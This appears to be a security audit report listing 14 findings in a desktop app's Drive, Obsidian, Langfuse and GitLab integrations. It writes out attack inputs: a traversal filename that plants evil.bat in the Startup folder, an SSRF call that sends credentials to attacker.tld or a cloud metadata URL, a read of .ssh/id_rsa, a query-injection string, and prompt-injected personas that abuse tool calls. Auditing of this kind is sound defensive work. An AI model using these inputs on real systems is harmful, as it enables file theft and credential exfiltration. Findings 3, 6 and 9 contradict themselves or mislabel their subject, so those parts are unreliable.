# Bug Hunt — External Integrations

> Group: Plugins
> Files scanned: 14
> Total: 4C / 5H / 4M / 1L = 14 findings

---

## 1. Drive pull writes attacker-controlled filename outside vault (path traversal via Google Drive)

- **Severity**: critical
- **Category**: path-traversal
- **File**: `src-tauri/src/commands/obsidian_brain/drive.rs:566`
- **Scenario**: A malicious file shared into the user's Drive `Personas/ObsidianSync/<vault>/<folder>/` (or any future shared-folder feature) names itself `..\..\..\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat`. On `obsidian_drive_pull_sync`, `local_folder.join(&df.name)` resolves to a path **outside** the vault. `std::fs::write(&local_path, &content)` writes the attacker payload into the user's Startup folder, achieving persistence.
- **Root cause**: `df.name` is taken verbatim from the Drive API list response with **zero validation** — no rejection of `..`, separators, absolute paths, or NUL bytes. `Path::join` happily resolves traversal segments since Rust's PathBuf does not normalize.
- **Impact**: Anyone who can land a file in the synced Drive folder (e.g. via shared-folder collaborator, malicious script the user briefly granted Drive access) gets arbitrary write outside the vault — RCE on Windows via Startup folder, on macOS/Linux via `~/.bashrc`/`~/.config/autostart/`.
- **Fix sketch**: Validate `df.name` is a single path component: reject if it contains `/`, `\`, `..`, NUL, or is absolute / drive-lettered. After `local_folder.join(&df.name)`, canonicalize and assert `starts_with(&local_folder)` before writing.

## 2. Langfuse `langfuse_test_connection` exfiltrates Basic-auth credentials to attacker-controlled URL (SSRF + secret leak)

- **Severity**: critical
- **Category**: ssrf
- **File**: `src-tauri/src/langfuse/client.rs:20` (called from `commands/infrastructure/langfuse.rs:32`)
- **Scenario**: Attacker (e.g. via prompt-injected persona that chains a Tauri call, or UI on a compromised renderer) calls `langfuse_test_connection({host: "http://attacker.tld/log", public_key: "<victim_pk>", secret_key: "<victim_sk>"})`. The probe builds `Basic <base64(pk:sk)>` and `GET`s the attacker URL — credentials land in the attacker's access log. Worse: `host="http://169.254.169.254/latest/meta-data/iam/security-credentials/"` exfiltrates EC2 IAM credentials to the response body, returned via `LangfuseTestResult.message` (see `client.rs` further down — the response body is captured into the test result message).
- **Root cause**: No URL allowlist, no scheme restriction, no private-IP/loopback-blocking, no host validation. Cloud commands have `validate_cloud_url`; Langfuse has none. The command isn't gated by `require_auth_sync` either (line 32 — no auth check).
- **Impact**: Confirmed credential exfil for any caller of the IPC. Combined with prompt injection through tool-callable HTTP, a hostile context can drain the Langfuse SK/PK to any URL it picks.
- **Fix sketch**: In `langfuse_test_connection` and `langfuse_save_config`, parse `host` with `Url::parse`, require https scheme (or http+loopback), reject private IPs (RFC1918, link-local, metadata service ranges) and `file://`, and gate the command with `require_auth_sync`.

## 3. `obsidian_brain_read_vault_note` accepts absolute path that bypasses sandbox check

- **Severity**: critical
- **Category**: path-traversal
- **File**: `src-tauri/src/commands/obsidian_brain/mod.rs:1059`
- **Scenario**: Attacker (prompt injection inside the persona, or compromised persona tool) calls `obsidianBrainReadVaultNote("C:\\Users\\<user>\\.ssh\\id_rsa")`. The check `!target.starts_with(vault_base) && !target.starts_with(&config.vault_path)` is `false || false`, so the guard passes only when the path **is** inside the vault. Wait — re-read: `if !A && !B` → returns error only when both checks are false. With absolute `C:\Users\...\.ssh\id_rsa`, neither `starts_with(vault_base)` nor `starts_with(vault_path)` matches → returns the validation error. **However**, both checks are equivalent (vault_base == Path::new(&config.vault_path)) and on Windows `Path::starts_with` is case-sensitive — if the configured vault is `C:\Users\me\Vault` and the caller passes `c:\users\me\vault\..\..\.ssh\id_rsa` (lowercase or with `..` segments), `starts_with` returns true (it does literal component matching that ignores `..`), bypassing the guard and reading any file `read_to_string` can open.
- **Root cause**: `Path::starts_with` does **not** normalize `..` segments and is case-sensitive on Windows where the FS is not. No `canonicalize` before the comparison.
- **Impact**: Vault-scoped IPC becomes arbitrary file read for any file the desktop process can open (SSH keys, browser cookies, .env files).
- **Fix sketch**: `let target = vault_base.join(&file_path).canonicalize()?; if !target.starts_with(vault_base.canonicalize()?) { return Err(...); }`. Treat the input as relative-only; reject if it parses as absolute.

## 4. Obsidian push-sync writes are non-atomic; sync-state advances even on partial corruption

- **Severity**: critical
- **Category**: partial-sync
- **File**: `src-tauri/src/commands/obsidian_brain/mod.rs:289` (and 367, 429, 1177)
- **Scenario**: User runs `obsidian_brain_push_sync` while a memory file is being written; process is killed (OS reboot, `taskkill`, OOM). `std::fs::write(&file_path, &md_content)` truncates the destination first, then streams. If killed mid-write, vault file is now zero-length / partial. On the next pull, `three_way_compare` sees `vault_changed`, parses garbage frontmatter, and **silently overwrites the in-app memory** with the truncated body (`extract_yaml_field` returns None so old fields stay, but `new_content` becomes empty → `if new_content.is_empty() { &memory.content }` saves the original content … BUT the `new_title` extraction at line 556 still applies whatever single `# ` line survived, and the sync_state hash advances to the **partial vault hash**, marking the broken file as canonical).
- **Root cause**: Direct `fs::write` is not atomic. No tempfile-then-rename pattern. The sync-state is updated **after** the write (line 308), but a kill between write and sync-state still leaves a partial vault file with no audit trail.
- **Impact**: A reboot during push sync silently corrupts memories on the next pull, with the corrupted state recorded as the new canonical hash. Lost data with no error surfaced.
- **Fix sketch**: Write to `<file>.tmp`, fsync, then `rename` (atomic on same filesystem). Update sync-state only after the rename returns Ok.

## 5. Google provider refresh token stored in plaintext (not SecureString)

- **Severity**: high
- **Category**: token-leak
- **File**: `src-tauri/src/commands/infrastructure/auth.rs:830`
- **Scenario**: `auth.google_provider_refresh_token = provider_refresh_token;` — the field is `Option<String>`, not `SecureString`. It sits in the `AppStateInner` for the lifetime of the process. A core-dump, swap-file, or memory snapshot exposes the long-lived Google refresh token, which mints fresh access tokens with `drive.file` scope without further user interaction.
- **Root cause**: Mismatch with sibling field `google_provider_token` (SecureString). The keyring-stored copy is also unencrypted plaintext (`store_google_provider_refresh_token`).
- **Impact**: Persistent Drive access on a one-time memory disclosure. Refresh tokens don't expire on browser logout.
- **Fix sketch**: Wrap field in `SecureString`. Confirm `store_google_provider_refresh_token` writes to OS keyring with the same wrapper used for the Supabase refresh token.

## 6. GitLab Drive folder query injection via vault name

- **Severity**: high
- **Category**: silent-failure
- **File**: `src-tauri/src/commands/obsidian_brain/drive.rs:170` and `:543`
- **Scenario**: `vault_name` flows from `config.vault_name` (user-supplied at vault setup). If a user names their vault `Foo' or trashed = false or 'x` (or chooses a vault folder whose name contains an apostrophe like `O'Brien`), the Drive API query string `name = '{name}'` becomes malformed: `name = 'Foo' or trashed = false or 'x'`. Drive's query parser may treat this as a wide-open match, returning the **first** folder it finds — `ensure_vault_folder` then writes vault content into a **different user's folder** (e.g. a previously-shared parent), or fails silently and creates a duplicate.
- **Root cause**: Manual string interpolation into Drive's q-language with no escaping. Drive expects `'` inside literals to be escaped as `\'`.
- **Impact**: Cross-folder data exposure when a user naturally names their vault with an apostrophe; or deliberate exfil (write secrets into an attacker-controlled shared folder) when the user is tricked into a malicious vault name.
- **Fix sketch**: Escape `\` and `'` per Drive's q-language rules: `name.replace('\\', "\\\\").replace('\'', "\\'")`. Apply to all five query sites in this file.

## 7. GitLab CI/CD variable provisioning is non-atomic; partial failure leaves orphan secrets

- **Severity**: high
- **Category**: cleanup-gap
- **File**: `src-tauri/src/commands/infrastructure/gitlab.rs:259-273` (and `:614-628`)
- **Scenario**: Persona has 4 credentials. `try_join_all` pushes all four `upsert_variable` calls in parallel. The 3rd succeeds, the 4th 403's. `try_join_all` returns the error — but the first three credentials are now **committed** as masked CI/CD variables on the GitLab project, with no rollback. The deploy fails, no audit-log entry is written, and the user has no UI surface listing what was leaked.
- **Root cause**: No two-phase commit, no try/catch with reverse-delete on partial failure, no recording of in-flight variable keys for cleanup.
- **Impact**: Secrets persist on a project that the user thinks failed deployment. Combined with Bug #11 (no per-variable scope check), this leaks API keys to whatever GitLab project the user pointed at — even one they shouldn't have permission for if the token has overly broad scope.
- **Fix sketch**: Track successful variable.key values; on any error, sequentially `delete_variable` for each before returning the error. Write a single audit log entry summarizing what landed and what was rolled back.

## 8. Prompt-injection persona can name itself with path traversal, escaping vault personas folder

- **Severity**: high
- **Category**: path-traversal
- **File**: `src-tauri/src/commands/obsidian_brain/markdown.rs:145` (sanitize_filename)
- **Scenario**: A persona is named `..` (the literal string two dots). `sanitize_filename` only replaces `/ \ : * ? " < > |` — `.` is preserved. After `trim_matches('-')` and length check, output is `..`. Push sync joins: `vault_base/<personas_folder>/../`. `std::fs::create_dir_all` happily creates that (no-op or escapes). Subsequent file writes (`profile.md`, memories) land in `<personas_folder>'s parent` — i.e. inside the vault root. Worse: persona name = `../../../EvilFolder` escapes the vault entirely on Linux/macOS (`create_dir_all` will `mkdir -p` outside the vault).
- **Root cause**: `sanitize_filename` does not reject `.` or `..` segments and does not collapse multiple dots. Persona names from prompt-injection / API-created personas aren't strictly validated.
- **Impact**: Arbitrary directory creation and file write outside the vault folder. Combined with the daily-note appender (which uses similar logic) gives write-anywhere primitive.
- **Fix sketch**: After sanitization, reject `.` and `..` outright; require at least one alphanumeric character. Add an explicit `if name == "." || name == ".." || name.starts_with('.')` check before joining paths.

## 9. OAuth state nonce shared between regular Google login and Drive re-auth — race re-entry

- **Severity**: high
- **Category**: oauth-state
- **File**: `src-tauri/src/commands/infrastructure/auth.rs:516-518` and `:753`
- **Scenario**: User clicks "Sign in with Google" — `pending_oauth_state = Some(N1)`. Before the popup completes, user clicks "Connect Google Drive" — the guard at line 504 errors: "An OAuth sign-in is already in progress". Fine. But: user closes the first popup without completing → `pending_oauth_state` is still `Some(N1)`. The user clicks "Connect Drive", still blocked. They restart the app → `pending_oauth_state` is dropped on memory wipe but if the **first** OAuth window's redirect fires later (network delay, manual deep-link) with `app_state=N1`, and the user has now started a Drive re-auth with `pending_oauth_state=N2`, the late-arriving N1 callback enters `handle_auth_callback`, mismatches N2, takes() the state → **clears the pending Drive nonce**, and the user's intended Drive consent now has no protection (next callback finds `(None, _)` and is rejected with the "unsolicited callback" branch — actually safe). HOWEVER: in the success branch at line 753, `auth.pending_oauth_state.take()` happens before the match — if expected is None and received Some, it falls to the (None, _) arm and rejects, OK. Real bug: a single shared state-slot for two concurrent flows means a stale nonce from flow A blocks flow B, and the user has no UI to cancel — `clear_pending_oauth` exists but is hidden behind no UX path users discover. Functional DoS rather than a security hole, but on a popup-failure the user is locked out of OAuth re-auth permanently until they hit the unlisted IPC.
- **Root cause**: One nonce slot, no expiry timestamp, no cancel surface in the UI. (The nonce never times out — see no `pending_oauth_started_at` field.)
- **Impact**: Users locked out of Google Drive sign-in forever after a failed OAuth attempt until they restart the app or call `clear_pending_oauth`. Support burden + broken Drive sync feature.
- **Fix sketch**: Store `(nonce, started_at, flow_kind)`; on new login attempt, allow override if started_at > 60s ago. Surface a "Cancel pending sign-in" button when guard is hit.

## 10. Langfuse trace ID truncation can collide span IDs within a trace

- **Severity**: medium
- **Category**: edge-case
- **File**: `src-tauri/src/langfuse/exporter.rs:529`
- **Scenario**: `uuid_to_span_id_hex` truncates UUID hex to first 16 chars. Two TraceSpans within the same execution whose UUID v4 happens to share the first 16 hex chars (probability ≈ 1/2^64 per pair, but birthday-bound across N spans → 1/2^32 per execution at N=65k spans, much lower in practice — yet not theoretical for long-running pipeline executions with deeply-nested chain calls). Collision creates two OTLP spans with the same `spanId` under one trace; Langfuse rejects the second silently or worse, mis-parents observations.
- **Root cause**: Span IDs require 8 random bytes per OTLP spec, so 16 hex chars is correct, but extracting from the **front** of a v4 UUID hex is biased — UUID v4 puts version/variant bits at fixed positions (chars 12, 16). The first 16 chars are: 8 random + version=4 + 3 random = mostly random but with a deterministic '4' at position 12. Collisions are rarer than uniform but the upstream UUIDs aren't guaranteed to be v4 — `chain_trace_id` is propagated as-is, sometimes from external sources.
- **Impact**: Lost trace data in Langfuse; misparented spans show wrong cost/latency attribution.
- **Fix sketch**: Hash the full UUID with a fast 64-bit hash (xxhash, siphash) and hex-encode → 16 chars, uniform distribution. Or: keep a per-execution span counter and append, ensuring uniqueness.

## 11. GitLab token scope not validated; over-broad PATs accepted

- **Severity**: medium
- **Category**: scope-over-grant
- **File**: `src-tauri/src/commands/infrastructure/gitlab.rs:64`
- **Scenario**: User pastes a GitLab PAT with scope `api` (full read/write to **all** their projects/groups). `gitlab_connect` only validates `validate_token()` succeeds (token is recognized) — never checks the granted scopes. Persona prompt-injection that gains tool call rights can call `gitlab_revoke_credentials`, `gitlab_undeploy_agent`, or `gitlab_deploy_persona` against any project — including production groups the user never intended to expose to the agent.
- **Root cause**: No scope inspection on connect. PATs in GitLab carry their granted scopes accessible via `/api/v4/personal_access_tokens/self`.
- **Impact**: A persona compromise becomes full-account GitLab compromise. The "least privilege" intent is undermined.
- **Fix sketch**: After `validate_token`, GET `/personal_access_tokens/self` and warn the user (or block save) if scope > `api` is granted. Recommend scoped `read_api` + `write_repository` + project-scoped tokens.

## 12. Vault discovery reads attacker-controlled `obsidian.json` paths without validation

- **Severity**: medium
- **Category**: path-traversal
- **File**: `src-tauri/src/commands/obsidian_brain/mod.rs:67-79`
- **Scenario**: An attacker who can write to `%APPDATA%\obsidian\obsidian.json` (e.g. via prior unprivileged file write) inserts `"vaults": {"x": {"path": "C:\\Users\\me\\.ssh"}}`. The user sees `.ssh` as a "detected vault" in the picker, clicks it. Subsequent `obsidian_brain_test_connection` checks for `.obsidian/` — fails, so no further damage. But if the attacker also creates `C:\Users\me\.ssh\.obsidian\` first (single empty dir), the test passes, and `obsidian_brain_save_config` happily stores `.ssh` as the vault. Future pull-sync now writes attacker-controlled markdown into `.ssh`, and read-vault-note (subject to bug #3) reads from `.ssh`.
- **Root cause**: Trust given to the contents of `obsidian.json` without sanity-checking that the `path` value is plausible (e.g. user-typed long-form path, not in well-known sensitive directories).
- **Impact**: Pivot from arbitrary file write in AppData to vault hijack.
- **Fix sketch**: Reject vault paths whose components include `.ssh`, `.aws`, `.config`, `AppData/Roaming/Microsoft`, `Library/Keychains`, etc. Or simpler: require the user to confirm the path in the UI before saving.

## 13. Obsidian push-sync skips empty `personaIds[]` on frontend, but backend still treats `None` as "all" — UI/backend contract mismatch

- **Severity**: medium
- **Category**: silent-failure
- **File**: `src/api/obsidianBrain/index.ts:117` vs. `src-tauri/src/commands/obsidian_brain/mod.rs:231`
- **Scenario**: A future caller (different code path, persona tool, or automation) calls the Tauri IPC `obsidian_brain_push_sync` directly with `persona_ids: null`, expecting "sync nothing" semantics from the docstring. Backend treats `None` as "sync ALL personas". Frontend's special-case at line 120 (`personaIds.length === 0` short-circuits to empty result) is the **only** place this contract is enforced.
- **Root cause**: The contract is split across two layers; the safer default (`None == nothing`) lives only in the TS shim. Backend default is the destructive one.
- **Impact**: Bypass the frontend → accidentally nuke-sync the entire vault; or any non-typescript caller (CLI tool, Rust integration test, Tauri-from-Tauri) gets opposite of documented behavior.
- **Fix sketch**: Move the empty-vec semantics to the Rust handler: `if persona_ids.as_ref().map(|v| v.is_empty()).unwrap_or(false) { return Ok(...); }`. Document `None` explicitly at the IPC boundary.

## 14. Tag-conflict retry races: parallel deploy_versioned can produce two distinct tags pointing to same version label

- **Severity**: low
- **Category**: race-condition
- **File**: `src-tauri/src/commands/infrastructure/gitlab.rs:704-761`
- **Scenario**: User clicks "Deploy" twice in rapid succession (or two persona instances trigger versioned deploy). Both fetch `existing_tags` concurrently before either writes, both compute `max_version + 1 = N`. Both call `create_tag(persona/foo/vN)`. One succeeds, the other 409s on the first attempt then retries with `vN+1` and succeeds. Now `vN` and `vN+1` are sibling tags with **different commit SHAs** (default branch advanced between deploys), but no audit trail records that they were the same logical deploy intent. Rollback ambiguity later.
- **Root cause**: Read-then-write without serialization or mutex; the retry loop fixes single-call concurrency on GitLab but not multi-call concurrency on the local side.
- **Impact**: Confusing version history; rollback to "latest" picks the wrong one. Not a security issue.
- **Fix sketch**: Serialize deploy_versioned per (project_id, persona_name) with a tokio Mutex map. Or use GitLab's optimistic-concurrency tag with `If-Match` on the existing tag list.
